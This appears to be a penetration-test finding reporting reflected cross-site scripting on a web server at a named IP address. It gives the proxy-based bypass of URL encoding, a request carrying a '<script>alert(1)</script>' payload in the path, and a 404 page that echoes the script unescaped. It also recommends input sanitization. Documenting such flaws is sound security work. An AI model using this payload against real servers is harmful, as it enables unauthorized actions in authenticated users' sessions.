We have managed to bypass client-side protection (URL encoding) by intercepting the HTTP request using an HTTP Proxy tool and then inserting the XSS payload in the URL. This would result in unauthorized actions execution in the context of the authenticated user (e.g. admin). This can be used in conjuction with Social Engineering techniques.

User Input Sanitization should be implemented for fixing this issue.

Below, evidence is provided.


Original Request:
GET / HTTP/1.1
Host: 80.28.218.49
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: ksp=
Upgrade-Insecure-Requests: 1



Edited/Malicious Request:
GET /<script>alert(1)</script> HTTP/1.1
Host: 80.28.218.49
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: ksp=
Upgrade-Insecure-Requests: 1


Response:
HTTP/1.0 404 Document not found
Connection: close
Content-type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Error</title></head><body>
<h1>Error 404 </h1>
<p>Document not found</p>
<p>/<script>alert(1)</script></p></body>
</html>
